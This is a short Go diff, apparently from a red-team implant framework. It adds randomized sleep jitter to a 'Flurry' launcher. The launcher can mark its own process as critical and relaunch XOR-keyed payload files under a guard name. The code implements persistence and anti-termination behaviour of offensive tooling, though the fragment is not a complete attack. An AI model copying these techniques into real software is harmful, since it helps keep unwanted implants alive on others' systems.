@@ -28,6 +28,7 @@ import (
 	"github.com/iDigitalFlame/xmt/data/crypto"
 	"github.com/iDigitalFlame/xmt/device"
 	"github.com/iDigitalFlame/xmt/man"
+	"github.com/iDigitalFlame/xmt/util"
 )
 
 // Start attempts to create a Flurry instance with the supplied arguments.
@@ -48,7 +49,7 @@ import (
 //               key value.
 func Start(critical bool, l man.Linker, guard string, key []byte, files []string) {
 	var z bool
-	if critical {
+	if time.Sleep(time.Millisecond * time.Duration(100+util.FastRandN(200))); critical {
 		z, _ = device.SetCritical(true)
 	}
 	if man.WakeMultiFile(l, guard, crypto.XOR(key), files); critical && !z {
@@ -94,7 +95,7 @@ func Loop(wait time.Duration, critical bool, l man.Linker, guard string, key []b
 		z, _ = device.SetCritical(true)
 	}
 loop:
-	for {
+	for time.Sleep(time.Millisecond * time.Duration(100+util.FastRandN(200))); ; {
 		select {
 		case <-w:
 			break loop
